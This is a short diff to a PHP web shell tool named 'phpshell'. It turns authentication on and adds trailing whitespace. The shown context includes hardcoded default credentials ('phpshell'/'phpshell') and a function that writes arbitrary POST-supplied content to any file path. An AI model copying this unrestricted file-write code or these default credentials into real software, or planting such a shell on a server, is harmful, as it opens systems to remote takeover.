@@ -8,7 +8,7 @@ $GLOBALS['PC'] = array(
 'MODE' => 'interactive-stdin',
 'WIN_PROMPT' => '%cwd%> ', //Classic DOS style
 'NIX_PROMPT' => '%user%@%hostname%:%cwd% #',
-'USE_AUTH' => false,
+'USE_AUTH' => true,
 'AUTH_USERNAME' => 'phpshell',
 'AUTH_PASSWORD' => 'phpshell',
 'ENV' => array(
@@ -659,7 +659,7 @@ echo file_put_contents($_POST['qedit_fn'],$_POST['qedit_content']);
 }
 rC('ps_qedit','qedit','Edit various data files. supported: txt');
 ?>
-<?php
+<?php   
 function ps_qput($args){
 echo '<iframe src="?qputfrm=1&cwd='. urlencode($_POST['cwd']) .'"><iframe>';
 }
